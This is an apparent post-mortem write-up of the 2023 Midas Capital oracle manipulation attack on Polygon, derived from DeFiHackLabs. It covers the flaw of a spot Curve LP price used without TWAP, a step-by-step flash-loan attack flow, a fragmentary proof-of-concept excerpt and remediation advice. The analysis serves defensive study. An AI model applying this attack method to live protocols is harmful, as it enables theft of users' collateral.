# Midas Capital — Oracle Price Manipulation via Liquidation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-01-18 |
| **Protocol** | Midas Capital |
| **Chain** | Polygon |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | [0x0053490215...](https://polygonscan.com/tx/0x0053490215baf541362fc78be0de98e3147f40223238d5b12512b3e26c0a2c2f) |
| **Vulnerable Contract** | [0x23F43c1002...](https://polygonscan.com/address/0x23F43c1002EEB2b146F286105a9a2FC75Bf770A4) |
| **Root Cause** | The Curve LP token price oracle directly consumed the `get_virtual_price()` spot value without TWAP validation, allowing pool manipulation within a single block to distort collateral value |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/Midas_exp.sol) |

---
## 1. Vulnerability Overview

Midas Capital is a lending protocol based on a Compound fork that accepts Curve LP tokens as collateral. The attacker combined flash loans from Balancer and Aave V3/V2 to manipulate Curve pool liquidity, artificially inflating collateral value, then liquidated other users' positions under unfavorable conditions to extract profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: PriceProvider uses spot Curve LP price
interface PriceProvider {
    function getUnderlyingPrice(address cTokens) external view returns (uint256);
    // ❌ Based on current virtual_price or spot price of the Curve pool
    // Price can be distorted by manipulating Curve pool liquidity via flash loan
}

// ❌ Liquidation function: liquidation possible using manipulated price
function liquidateBorrow(
    address borrower,
    uint256 repayAmount,
    address cTokenCollateral
) external {
    // Collateral value calculated via priceProvider.getUnderlyingPrice()
    // Liquidator acquires excessive collateral under price-manipulated state
}

// ✅ Fix: Use time-weighted average or Chainlink oracle
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Curve LP token price oracle directly consumed get_virtual_price() spot value without TWAP validation, allowing pool manipulation within a single block to distort collateral value
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Balancer flash loan (borrow large amount of stMATIC, etc.)
  │
  ├─2─▶ Aave V3 flash loan (borrow additional assets)
  │
  ├─3─▶ Add large liquidity to Curve pool
  │       → Curve LP token price spikes (oracle manipulation)
  │
  ├─4─▶ Liquidate other users' positions using manipulated price
  │       Call LiquidateContract.liquidate()
  │       → Acquire collateral (cToken) at a discount
  │
  ├─5─▶ Redeem collateral → receive underlying assets
  │
  ├─6─▶ Withdraw Curve liquidity
  │
  └─7─▶ Repay flash loans → realize net profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract LiquidateContract {
    function liquidate(address receiver) external payable {
        // Approve underlying tokens for each cToken
        IERC20(FJCHF.underlying()).approve(address(FJCHF), type(uint256).max);
        IERC20(FJEUR.underlying()).approve(address(FJEUR), type(uint256).max);

        // Execute liquidation under manipulated price
        // Acquire borrower's WMATIC-stMATIC LP collateral at a discount
        FJCHF.liquidateBorrow(
            receiver,                                    // liquidation target
            IERC20(FJCHF.underlying()).balanceOf(address(this)),  // repay amount
            address(WMATIC_STMATIC)                      // collateral cToken
        );
        // Repeat to liquidate multiple positions
    }
}

function receiveFlashLoan(/* Balancer callback */) external {
    // Additional Aave V3 flash loan
    aaveV3Flashloan();
    // Manipulate Curve pool and execute liquidation
    manipulateAndLiquidate();
    // Repay flash loans
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Oracle Manipulation + Liquidation Attack |
| **Attack Vector** | Flash Loan + Curve LP Price Manipulation |
| **Impact Scope** | Lending protocol collateral system |
| **DASP Classification** | Oracle Manipulation |
| **CWE** | CWE-20: Improper Input Validation |

## 6. Remediation Recommendations

1. **Improve Curve LP Price Calculation**: Use a combined approach of `virtual_price` + TWAP.
2. **Parallel Chainlink Oracle**: Cross-validate against an independent external price feed.
3. **Liquidation Cap**: Limit the volume that can be liquidated within a single block.
4. **Price Deviation Circuit Breaker**: Temporarily pause the protocol on sharp price movements.

## 7. Lessons Learned

- Compound fork protocols require special care in oracle design, and LP token collateral is particularly vulnerable.
- Attacks combining multiple flash loans (Balancer + Aave) bypass defenses designed for simple single flash loan scenarios.
- Liquidation mechanisms and price oracles must be reviewed together as a unified security surface.